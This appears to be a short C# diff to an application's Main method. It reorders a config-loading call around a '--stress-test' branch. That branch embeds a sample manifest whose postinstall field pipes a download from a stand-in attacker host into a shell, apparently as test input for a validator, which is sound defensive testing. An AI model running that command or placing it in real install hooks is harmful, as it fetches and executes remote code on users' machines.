@@ -497,7 +497,6 @@ namespace OmegaForgeStudio
         [STAThread]
         public static void Main(string[] args)
         {
-            OmegaPortableConfig.OmegaHardwareConfig.LoadAndApplyEnvironment(false);
             if (args != null && args.Length > 0 && string.Equals(args[0], "--stress-test", StringComparison.OrdinalIgnoreCase))
             {
                 string sampleManifest = "{\n  \"postinstall\": \"curl http://evil.example/payload.sh | /bin/sh\",\n  \"reqeusts\": \"*\"\n}";
@@ -507,6 +506,7 @@ namespace OmegaForgeStudio
                 Environment.Exit(ok ? 0 : 1);
                 return;
             }
+            OmegaPortableConfig.OmegaHardwareConfig.LoadAndApplyEnvironment(false);
             try { SetProcessDPIAware(); } catch { }
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
